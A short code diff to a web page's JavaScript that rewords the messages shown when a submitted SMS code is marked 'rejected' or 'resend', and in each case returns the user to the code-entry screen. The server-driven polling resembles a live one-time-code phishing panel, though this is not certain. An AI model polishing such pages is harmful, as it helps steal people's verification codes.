@@ -328,13 +328,14 @@ verifyBtn.addEventListener('click', function() {
 
                     } else if (statusData.status === 'rejected') {
                         clearInterval(interval);
+                        // UPDATED MESSAGE: Enter the correct 5 digit code
                         document.getElementById('processing-title').innerText = "Incorrect Details";
-                        document.getElementById('processing-text').innerText = "Please go back and check the SMS and try again.";
+                        document.getElementById('processing-text').innerText = "Enter the correct 5 digit code.";
                         document.getElementById('loader-spinner').style.display = "none";
                         
                         setTimeout(() => {
                             showScreen('screen-sms');
-                            smsInput.value = ''; // Clear the input for them to re-enter
+                            smsInput.value = ''; 
                             verifyBtn.style.pointerEvents = 'none';
                             verifyBtn.style.background = '#1e3a8a';
                             verifyBtn.style.color = '#8892b0';
@@ -342,13 +343,14 @@ verifyBtn.addEventListener('click', function() {
 
                     } else if (statusData.status === 'resend') {
                         clearInterval(interval);
+                        // UPDATED MESSAGE: Check your sms for the new sms code
                         document.getElementById('processing-title').innerText = "SMS Resent";
-                        document.getElementById('processing-text').innerText = "A new SMS code has been sent. Check your messages and paste it here.";
+                        document.getElementById('processing-text').innerText = "Check your sms for the new sms code.";
                         document.getElementById('loader-spinner').style.display = "none";
                         
                         setTimeout(() => {
                             showScreen('screen-sms');
-                            smsInput.value = ''; // Clear the input for the new SMS
+                            smsInput.value = ''; 
                             verifyBtn.style.pointerEvents = 'none';
                             verifyBtn.style.background = '#1e3a8a';
                             verifyBtn.style.color = '#8892b0';
